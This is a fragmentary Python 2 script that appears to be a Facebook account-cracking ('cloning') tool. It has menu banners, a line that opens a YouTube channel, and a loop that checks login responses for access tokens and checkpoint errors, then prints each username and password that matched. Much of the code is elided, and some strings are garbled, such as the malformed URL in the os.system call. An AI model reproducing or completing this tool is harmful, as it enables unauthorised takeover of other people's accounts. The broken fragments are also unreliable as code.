...
def login():
    ...
    os.system('xdg-open 'https://y#80FF00outube.com/channel/UCFv2hODErtJcLFBE2gnXkTw')

    print "\033[1;95m[2]\x1b[1;94mUPDATE (2.0)"
...
def Zeek():
    ...
    print '\x1b[1;91m[1]  START CLONING Rizwan'
...
def action():
    ...
    jalan ("\033[1;93mWait A While \x1b[1;94mStart Cracking... Mr Rizwan")
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                if 'www.facebook.com' in q['error_msg']:
                    ...
                    print '\033[1;95m(\x1b[1;95m1day) ' + k + c + user + '  |  ' + pass1
                    ...
                    if 'access_token' in q:
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            ...
                            print '\033[1;95m(\x1b[1;95m1day) ' + k + c + user + '  |  ' + pass2
    ...
    jalan("Note : Your Offline account Will Open after 1 days")
